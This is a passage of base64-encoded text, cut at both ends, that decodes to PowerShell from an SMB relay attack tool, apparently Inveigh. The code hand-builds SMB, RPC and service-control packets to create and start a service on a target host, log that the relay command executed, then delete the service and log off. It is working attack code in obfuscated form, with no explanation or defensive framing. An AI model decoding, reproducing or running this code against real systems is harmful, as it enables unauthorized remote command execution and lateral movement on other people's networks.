kcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTVN0YXJ0U2VydmljZVcgJFNNQl9zZXJ2aWNlX2NvbnRleHRfaGFuZGxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5MZW5ndGggMCAwIDB4MDMsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MTMsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CV3JpdGVBbmRYUmVxdWVzdCAkU01CX0ZJRCAoJFJQQ19kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQl9kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkQW5kWFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdEZWxldGVTZXJ2aWNlVycgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMTIuLjExNV0pIC1lcSAnMzEtMDQtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRpb24gZmFpbGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGNyZWF0aW9uIGZhaWxlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGlvbiBmYWlsZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdEZWxldGVTZXJ2aWNlVycKICAgICAgICAgICAgICAgICAgICAgICAgeyAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbODguLjkxXSkgLWVxICcxZC0wNC0wMC0wMCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBjb21tYW5kIGV4ZWN1dGVkIG9uICRUYXJnZXQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgY29tbWFuZCBleGVjdXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBjb21tYW5kIGV4ZWN1dGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzg4Li45MV0pIC1lcSAnMDItMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZmFpbGVkIHRvIHN0YXJ0IG9uICRUYXJnZXQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZmFpbGVkIHRvIHN0YXJ0IG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGZhaWxlZCB0byBzdGFydCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHgyZiAweDE4IDB4MDUsMHgyOCAkU01CX3RyZWVfSUQgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNRGVsZXRlU2VydmljZVcgJFNNQl9zZXJ2aWNlX2NvbnRleHRfaGFuZGxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NDTV9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgMHgwMyAkU0NNX2RhdGEuTGVuZ3RoIDAgMCAweDA0LDB4MDAsMHgwMCwweDAwIDB4MDAsMHgwMCAweDAyLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QgJFNNQl9GSUQgKCRSUENfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUJfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoICsgJFJQQ19kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkQW5kWFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZV9uZXh0ID0gJ0Nsb3NlU2VydmljZUhhbmRsZScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xvc2Vfc2VydmljZV9oYW5kbGVfc3RhZ2UgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdDbG9zZVNlcnZpY2VIYW5kbGUnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX2Nsb3NlX3NlcnZpY2VfaGFuZGxlX3N0YWdlIC1lcSAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZGVsZXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2Nsb3NlX3NlcnZpY2VfaGFuZGxlX3N0YWdlKysKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTUNsb3NlU2VydmljZUhhbmRsZSAkU01CX3NlcnZpY2VfY29udGV4dF9oYW5kbGUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGRlbGV0ZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZGVsZXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0Nsb3NlUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTUNsb3NlU2VydmljZUhhbmRsZSAkU01CX3NlcnZpY2VfbWFuYWdlcl9jb250ZXh0X2hhbmRsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHgyZiAweDE4IDB4MDUsMHgyOCAkU01CX3RyZWVfSUQgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU0NNX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5MZW5ndGggMCAwIDB4MDUsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MDAsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QgJFNNQl9GSUQgKCRSUENfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUJfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoICsgJFJQQ19kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdDbG9zZVJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHgwNCAweDE4IDB4MDcsMHhjOCAkU01CX3RyZWVfSUQgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQkNsb3NlUmVxdWVzdCAweDAwLDB4NDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkU01CX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnVHJlZURpc2Nvbm5lY3QnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdUcmVlRGlzY29ubmVjdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDcxIDB4MTggMHgwNywweGM4ICRTTUJfdHJlZV9JRCAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CVHJlZURpc2Nvbm5lY3RSZXF1ZXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFNNQl9kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0xvZ29mZicKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJ0xvZ29mZicKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDc0IDB4MTggMHgwNywweGM4IDB4MzQsMHhmZSAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CTG9nb2ZmQW5kWFJlcXVlc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkU01CX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnRXhpdCcKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfZmFpbGVkKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBmYWlsZWQgb24gJFRh